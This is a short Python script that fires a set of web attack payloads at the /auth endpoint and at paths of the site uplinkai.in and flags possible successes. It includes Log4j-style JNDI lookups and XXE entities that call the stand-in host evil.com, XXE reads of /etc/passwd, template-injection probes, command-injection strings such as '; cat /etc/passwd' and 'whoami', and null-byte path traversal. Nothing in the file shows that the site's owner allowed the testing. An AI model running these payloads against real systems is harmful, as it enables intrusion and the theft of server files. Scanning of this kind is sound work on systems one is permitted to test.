import requests
import json
import time
import subprocess
import os

# Test for potential zero-day exploits and advanced persistent threats
def test_zero_day_exploits():
    print("=== ZERO-DAY AND ADVANCED PERSISTENT THREAT TESTING ===")
    
    base_url = "https://uplinkai.in"
    
    print("1. Testing for Log4j-style JNDI injection...")
    
    # Test for Log4j-style vulnerabilities
    jndi_payloads = [
        "${jndi:ldap://evil.com:1389/evil}",
        "${jndi:dns://evil.com/evil}",
        "${jndi:rmi://evil.com:1099/evil}",
        "test${hostName}test",
        "test${env:USER}test"
    ]
    
    for payload in jndi_payloads:
        try:
            response = requests.post(f"{base_url}/auth", 
                                   data={"email": payload, "password": "test"}, 
                                   timeout=10)
            print(f"JNDI payload: {response.status_code}")
        except Exception as e:
            print(f"JNDI test error: {e}")
    
    print("\n2. Testing for XML External Entity (XXE) attacks...")
    
    # Test for XXE vulnerabilities
    xxe_payloads = [
        """<?xml version="1.0"?>
        <!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]>
        <root>&test;</root>""",
        """<?xml version="1.0"?>
        <!DOCTYPE root [<!ENTITY test SYSTEM "http://evil.com/evil.dtd">]>
        <root>&test;</root>""",
        """<?xml version="1.0"?>
        <!DOCTYPE root [<!ENTITY % test SYSTEM "http://evil.com/evil.dtd">%test;]>
        <root/>"""
    ]
    
    for payload in xxe_payloads:
        try:
            headers = {"Content-Type": "application/xml"}
            response = requests.post(f"{base_url}/auth", 
                                   data=payload, headers=headers, timeout=10)
            print(f"XXE payload: {response.status_code}")
        except Exception as e:
            print(f"XXE test error: {e}")
    
    print("\n3. Testing for Server-Side Template Injection (SSTI)...")
    
    # Test for SSTI vulnerabilities
    ssti_payloads = [
        "{{7*7}}",
        "${7*7}",
        "<%=7*7%>",
        "{{config}}",
        "${config}",
        "#{7*7}",
        "{{7*'7'}}",
        "${7*'7'}"
    ]
    
    for payload in ssti_payloads:
        try:
            response = requests.post(f"{base_url}/auth", 
                                   data={"email": payload, "password": "test"}, 
                                   timeout=10)
            print(f"SSTI payload: {response.status_code}")
            if "49" in response.text or "config" in response.text:
                print(f"  ⚠️  POTENTIAL SSTI SUCCESS!")
        except Exception as e:
            print(f"SSTI test error: {e}")
    
    print("\n4. Testing for Remote Code Execution (RCE)...")
    
    # Test for RCE vulnerabilities
    rce_payloads = [
        "'; exec('id'); #",
        "'; system('whoami'); #",
        "|| cat /etc/passwd",
        "| cat /etc/passwd",
        "; cat /etc/passwd",
        "&& cat /etc/passwd",
        "`cat /etc/passwd`",
        "$(cat /etc/passwd)"
    ]
    
    for payload in rce_payloads:
        try:
            response = requests.post(f"{base_url}/auth", 
                                   data={"email": payload, "password": "test"}, 
                                   timeout=10)
            print(f"RCE payload: {response.status_code}")
            if "uid=" in response.text or "root:" in response.text:
                print(f"  ⚠️  POTENTIAL RCE SUCCESS!")
        except Exception as e:
            print(f"RCE test error: {e}")
    
    print("\n5. Testing for Path Traversal with Null Byte Injection...")
    
    # Test for path traversal with null bytes
    traversal_null_payloads = [
        "../../../etc/passwd%00",
        "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts%00",
        "../../../etc/passwd\x00",
        "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts\x00"
    ]
    
    for payload in traversal_null_payloads:
        try:
            response = requests.get(f"{base_url}/{payload}", timeout=10)
            print(f"Traversal with null: {response.status_code}")
            if response.status_code == 200 and ("root:" in response.text or "[boot loader]" in response.text):
                print(f"  ⚠️  POTENTIAL PATH TRAVERSAL SUCCESS!")
        except Exception as e:
            print(f"Traversal null test error: {e}")

if __name__ == "__main__":
    test_zero_day_exploits()
